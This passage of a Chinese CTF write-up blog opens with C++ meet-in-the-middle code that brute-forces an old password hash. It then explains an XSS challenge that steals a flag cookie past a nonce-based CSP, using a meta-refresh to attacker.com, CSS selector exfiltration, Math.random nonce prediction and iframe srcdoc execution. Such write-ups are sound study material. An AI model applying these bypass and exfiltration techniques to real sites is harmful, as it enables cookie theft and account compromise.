cc;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            cc.buf[&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;] = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            cc.buf[&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;] = i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; c = &lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;; c &amp;lt; &lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;; c++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                cc.buf[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] = c;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; d = &lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;; d &amp;lt; &lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;; d++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    cc.buf[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;] = d;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; a = &lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;; a &amp;lt; &lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;; a++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; sumer = fadd + i + c + d + a + &lt;span class=&#34;number&#34;&gt;1207&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        cc.buf[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] = a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; b = &lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;; b &amp;lt; &lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;; b++) &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (ok_maps[sumer + b]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            cc.buf[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] = b;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; pnr = &lt;span class=&#34;number&#34;&gt;0x63686163&lt;/span&gt;, pnr2 = &lt;span class=&#34;number&#34;&gt;0x68613230&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; ans = &lt;span class=&#34;built_in&#34;&gt;oldpw_rev&lt;/span&gt;(&amp;amp;pnr, &amp;amp;pnr2, fadd + i + c + d + a + b + &lt;span class=&#34;number&#34;&gt;1207&lt;/span&gt;, cs, &lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;// backward: suffix&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (ans != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            ans = &lt;span class=&#34;built_in&#34;&gt;oldpw_rev&lt;/span&gt;(&amp;amp;pnr, &amp;amp;pnr2, fadd + i + c + d + a + b, cc.buf, &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;// ... and extra 5 steps&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (ans != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            ++cnter; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            all.&lt;span class=&#34;built_in&#34;&gt;emplace_back&lt;/span&gt;(std::&lt;span class=&#34;built_in&#34;&gt;make_pair&lt;/span&gt;(std::&lt;span class=&#34;built_in&#34;&gt;make_pair&lt;/span&gt;(pnr, pnr2), cc)); &lt;span class=&#34;comment&#34;&gt;// possible nr/nr2 pair, record it&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            std::lock_guard&amp;lt;std::mutex&amp;gt; &lt;span class=&#34;built_in&#34;&gt;lock&lt;/span&gt;(mtx);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;auto&lt;/span&gt; &amp;amp;&amp;amp;p:all) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                maps[p.first] = p.second;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;auto&lt;/span&gt; &amp;amp;&amp;amp;th:ths) th.&lt;span class=&#34;built_in&#34;&gt;join&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ths.&lt;span class=&#34;built_in&#34;&gt;clear&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;MITM&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d\n&amp;quot;&lt;/span&gt;, cnter.&lt;span class=&#34;built_in&#34;&gt;load&lt;/span&gt;());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;; i++) &amp;#123; &lt;span class=&#34;comment&#34;&gt;// forward&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ths.&lt;span class=&#34;built_in&#34;&gt;emplace_back&lt;/span&gt;([&amp;amp;, i] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            buf[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] = i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; c = &lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;; c &amp;lt; &lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;; c++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                buf[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] = c;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; d = &lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;; d &amp;lt; &lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;; d++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    buf[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;] = d;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; a = &lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;; a &amp;lt; &lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;; a++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        buf[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;] = a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; b = &lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;; b &amp;lt; &lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;; b++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            buf[&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;] = b;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; e = &lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;; e &amp;lt; &lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;; e++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                buf[&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;] = e;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; re = uadd - i - c - d - a - b - e;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; iter = &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (re &amp;gt;= &lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;) &amp;#123; &lt;span class=&#34;comment&#34;&gt;// padding, to make the `add` value is `fadd`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; tw = re;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (re &amp;gt; &lt;span class=&#34;number&#34;&gt;126&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                        tw = &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                    buf[iter++] = tw;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                    re -= tw;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (re != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                buf[iter] = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; nr = fnr, nr2 = fnr2, add = fuadd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                forward(buf, iter, &amp;amp;nr, &amp;amp;nr2, &amp;amp;add);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                &lt;span class=&#34;keyword&#34;&gt;auto&lt;/span&gt; cc2 = std::&lt;span class=&#34;built_in&#34;&gt;make_pair&lt;/span&gt;(nr, nr2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (maps.&lt;span class=&#34;built_in&#34;&gt;find&lt;/span&gt;(cc2) != maps.&lt;span class=&#34;built_in&#34;&gt;end&lt;/span&gt;()) &amp;#123; &lt;span class=&#34;comment&#34;&gt;// GOT!!!&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%s%s%s%s\n&amp;quot;&lt;/span&gt;, cp, buf, maps[cc2].buf, cs);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                    &lt;span class=&#34;comment&#34;&gt;// exit(0);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;auto&lt;/span&gt; &amp;amp;&amp;amp;th:ths) th.&lt;span class=&#34;built_in&#34;&gt;join&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;Cha’s-Diary&#34;&gt;&lt;a href=&#34;#Cha’s-Diary&#34; class=&#34;headerlink&#34; title=&#34;Cha’s Diary&#34;&gt;&lt;/a&gt;Cha’s Diary&lt;/h2&gt;&lt;p&gt;非预期了。&lt;br&gt;储存型XSS，允许跨域。&lt;br&gt;有CSP策略保护，iframe被禁止加载，需要nonce来执行脚本：&lt;br&gt;&lt;code&gt;&amp;lt;meta http-equiv=&amp;quot;Content-Security-Policy&amp;quot; content=&amp;quot;script-src &amp;#39;nonce-&amp;lt;%= nonce %&amp;gt;&amp;#39;; frame-src &amp;#39;none&amp;#39;; object-src &amp;#39;none&amp;#39;; style-src &amp;#39;unsafe-inline&amp;#39; https://unpkg.com&amp;quot;&amp;gt;&lt;/code&gt;&lt;br&gt;目标是偷cookie里的flag.&lt;br&gt;我们可以利用meta标签进行跳转：&lt;br&gt;&lt;code&gt;&amp;lt;meta http-equiv=&amp;quot;refresh&amp;quot; content=&amp;quot;1; http://attacker.com&amp;quot;&amp;gt;&lt;/code&gt;&lt;br&gt;那么我们接下来要做的就是两步：获取nonce—&amp;gt;执行js  &lt;/p&gt;
&lt;h3 id=&#34;获取nonce&#34;&gt;&lt;a href=&#34;#获取nonce&#34; class=&#34;headerlink&#34; title=&#34;获取nonce&#34;&gt;&lt;/a&gt;获取nonce&lt;/h3&gt;&lt;p&gt;正解应该是通过注入CSS，用CSS匹配器匹配nonce属性，逐步获取nonce。&lt;br&gt;可能有人会好奇，每次页面刷新不是会重新生成nonce吗？但此题有一个特殊之处：传参方法是通过URL的&lt;code&gt;#&lt;/code&gt;锚（哈希&amp;#x2F;frame&amp;#x2F;…）来传参，并通过页内js动态渲染。因此当前进后退时并不会刷新，&lt;strong&gt;而是调用浏览器缓存。因此nonce不会改变&lt;/strong&gt;。&lt;br&gt;当时以为有&lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/nonce#description&#34;&gt;nonce hiding&lt;/a&gt;这种东西，所以没有往下尝试，结果赛后发现这似乎是个饼并未实现……当然，我们的做法是直接在新标签页fetch并拿到页面内容正则匹配，根本就不经过浏览器过滤。&lt;br&gt;官方的做法就是使用CSS注入每次偷一位，具体做法见&lt;a href=&#34;http://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html&#34;&gt;how-to-bypass-csp-nonces-with-dom-xss&lt;/a&gt;&lt;br&gt;核心部分：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;The summary of this attack is that it&amp;#x27;s possible to create a CSS program that exfiltrates the values of HTML attributes character-by-character, simply by generating HTTP requests every time a CSS selector matches, and repeating consecutively. If you haven&amp;#x27;t seen this working, take a look here. The way it works is very simple, it just creates a CSS attribute selector of the form:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*[attribute^=&amp;quot;a&amp;quot;]&amp;#123;background:url(&amp;quot;record?match=a&amp;quot;)&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*[attribute^=&amp;quot;b&amp;quot;]&amp;#123;background:url(&amp;quot;record?match=b&amp;quot;)&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*[attribute^=&amp;quot;c&amp;quot;]&amp;#123;background:url(&amp;quot;record?match=c&amp;quot;)&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[...]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;And then, once we get a match, repeat with:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*[attribute^=&amp;quot;aa&amp;quot;]&amp;#123;background:url(&amp;quot;record?match=aa&amp;quot;)&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*[attribute^=&amp;quot;ab&amp;quot;]&amp;#123;background:url(&amp;quot;record?match=ab&amp;quot;)&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*[attribute^=&amp;quot;ac&amp;quot;]&amp;#123;background:url(&amp;quot;record?match=ac&amp;quot;)&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[...]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Until it exfiltrates the complete attribute.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然而我们发现他只使用了&lt;code&gt;Math.random&lt;/code&gt;来生成随机nonce，这完全是可以预测的：&lt;a href=&#34;https://github.com/PwnFunction/v8-randomness-predictor&#34;&gt;https://github.com/PwnFunction/v8-randomness-predictor&lt;/a&gt;&lt;br&gt;&lt;strong&gt;于是我们新开一个标签页然后多次fetch阅读文章页面拿一堆nonce给预测器，直接就能知道下一个nonce.&lt;/strong&gt;  &lt;/p&gt;
&lt;h3 id=&#34;执行JS&#34;&gt;&lt;a href=&#34;#执行JS&#34; class=&#34;headerlink&#34; title=&#34;执行JS&#34;&gt;&lt;/a&gt;执行JS&lt;/h3&gt;&lt;p&gt;nonce已知之后可以直接在自己VPS上发送请求创建笔记。&lt;br&gt;接下来要让受害者加载页面才行。这个只需要看&lt;code&gt;share_read.js&lt;/code&gt;就会发现触发&lt;code&gt;hashchange&lt;/code&gt;事件即可。由于缓存（前进后退缓存，bfcache）的存在，我们可以在已知nonce的标签页随便开个页面然后&lt;code&gt;extra.history.go(-1);&lt;/code&gt;，并修改hash值便能再次触发post加载，让已经被回调函数删掉的事件监听器在重新运行的js中焕发第二春。&lt;br&gt;这时我们发现单纯插入script标签并不能被执行，因为js脚本是往页面DOM节点写入&lt;code&gt;innerText&lt;/code&gt;而已。&lt;br&gt;经过一番神秘的摸索，大战MDN的manual，我们发现了一个神奇的属性：&lt;code&gt;&amp;lt;iframe srcdoc=&amp;quot;...&amp;quot;&amp;gt;&lt;/code&gt;&lt;br&gt;在&lt;a href=&#34;https://csplite.com/csp/test188/&#34;&gt;CSP测试网站&lt;/a&gt;中是这么说的：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Content Security Policy: the srcdoc attribute in the iframe tag is not governed by frame-src, but its content is blocked by other directives of the parent page&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;也就是插入时就会执行。至此，我们得以执行插入的js代码。  &lt;/p&gt;
&lt;h3 id=&#34;备注&#34;&gt;&lt;a href=&#34;#备注&#34; class=&#34;headerlink&#34; title=&#34;备注&#34;&gt;&lt;/a&gt;备注&lt;/h3&gt;&lt;p&gt;官方idea来自这篇文章，也是场上找到过的材料：&lt;a href=&#34;https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/chrome-cache-to-xss&#34;&gt;Chrome Cache to XSS&lt;/a&gt;&lt;br&gt;其他一些很有用的材料：&lt;a href=&#34;http://sebastian-lekies.de/csp/bypasses.php&#34;&gt;Collection of CSP bypasses&lt;/a&gt;&lt;br&gt;CSP相关测试的网站：&lt;a href=&#34;https://csplite.com/csp/&#34;&gt;https://csplite.com/csp/&lt;/a&gt;&lt;br&gt;随机数预测解法的完整服务端代码：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span 